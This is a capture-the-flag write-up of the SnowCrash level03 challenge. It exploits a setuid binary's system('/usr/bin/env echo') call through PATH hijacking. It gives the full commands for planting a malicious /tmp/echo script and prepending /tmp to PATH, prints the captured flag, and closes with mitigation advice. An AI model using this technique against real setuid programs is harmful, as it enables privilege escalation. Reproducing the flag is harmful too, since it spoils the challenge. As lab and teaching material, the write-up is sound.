```markdown
# CTF Report: SnowCrash Level03

## Executive Summary
This level exploits a PATH hijacking vulnerability in the `level03` binary. The binary executes `/usr/bin/env echo` via `system()`, which can be manipulated by injecting a malicious `echo` script into the PATH. Successfully exploiting this vulnerability grants access to the flag.

**Flag:** `qi0maab88jeaj46qoumi7maus`

## Reconnaissance

### Initial Execution
```bash
level03@SnowCrash:~$ ./level03
Exploit me
```

### Dynamic Analysis with ltrace
```bash
level03@SnowCrash:~$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                                                = 2003
geteuid()                                                                                = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                      = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                      = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                   = 0
+++ exited (status 0) +++
```

### Key Findings
- Binary sets UID/GID to 2003 (likely flag03 user privileges)
- Executes: `system("/usr/bin/env echo Exploit me")`
- Uses `/usr/bin/env` to locate `echo` command via PATH environment variable
- Does NOT use absolute path for echo command

## Vulnerability Analysis

### Vulnerability Type
**PATH Environment Variable Hijacking**

### Root Cause
The binary uses `system("/usr/bin/env echo ...")` which:
1. Calls `/usr/bin/env` to find the `echo` executable
2. `/usr/bin/env` searches through directories listed in the PATH environment variable
3. PATH is user-controllable and can be manipulated
4. No absolute path is specified for the `echo` command

### Attack Vector
By placing a malicious executable named `echo` in a directory and prepending that directory to PATH, we can hijack the command execution.

## Exploitation

### Step 1: Create Malicious Echo Script
```bash
level03@SnowCrash:~$ cd /tmp
level03@SnowCrash:/tmp$ cat > /tmp/echo <<'EOF'
echo "Hijacked echo called with: $@"
getflag
EOF
```

### Step 2: Make Script Executable
```bash
level03@SnowCrash:/tmp$ chmod +x /tmp/echo
```

### Step 3: Modify PATH Environment Variable
```bash
level03@SnowCrash:/tmp$ PATH=/tmp:$PATH
```

This prepends `/tmp` to PATH, ensuring our malicious `echo` is found first.

### Step 4: Execute the Binary
```bash
level03@SnowCrash:/tmp$ cd ~
level03@SnowCrash:~$ ./level03
Hijacked echo called with: Exploit me
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

## Result

**Successfully captured flag:** `qi0maab88jeaj46qoumi7maus`

## Technical Details

### Exploit Chain
1. Binary runs with elevated privileges (UID/GID 2003)
2. Binary calls `system("/usr/bin/env echo Exploit me")`
3. `/usr/bin/env` searches PATH for `echo`
4. Our `/tmp/echo` is found first due to PATH manipulation
5. Our script executes with elevated privileges
6. `getflag` command runs and returns the flag

### Why This Works
- `setresuid()` and `setresgid()` maintain elevated privileges throughout execution
- `system()` spawns a shell that inherits the PATH environment variable
- `/usr/bin/env` is designed to search PATH, making it vulnerable to this attack
- The `/tmp` directory is writable by all users

## Security Recommendations

### For Developers
1. **Use Absolute Paths:** Always specify full paths for system commands
   ```c
   system("/bin/echo Exploit me");  // Instead of "echo"
   ```

2. **Avoid system() Calls:** Use `execve()` with explicit paths and controlled environments

3. **Sanitize Environment:** Reset PATH before executing external commands
   ```c
   setenv("PATH", "/usr/local/bin:/usr/bin:/bin", 1);
   ```

4. **Input Validation:** Never trust user-controlled environment variables in privileged contexts

### For System Administrators
1. Restrict write permissions on directories in default PATH
2. Implement mandatory access controls (SELinux, AppArmor)
3. Monitor for unusual PATH modifications in privileged processes
4. Use code signing and integrity checks for critical binaries

## References
- CWE-426: Untrusted Search Path
- CWE-427: Uncontrolled Search Path Element
- OWASP: Command Injection

## Timeline
- Initial reconnaissance and binary execution
- Dynamic analysis using ltrace
- Vulnerability identification (PATH hijacking)
- Exploit development and testing
- Successful flag capture: `qi0maab88jeaj46qoumi7maus`
```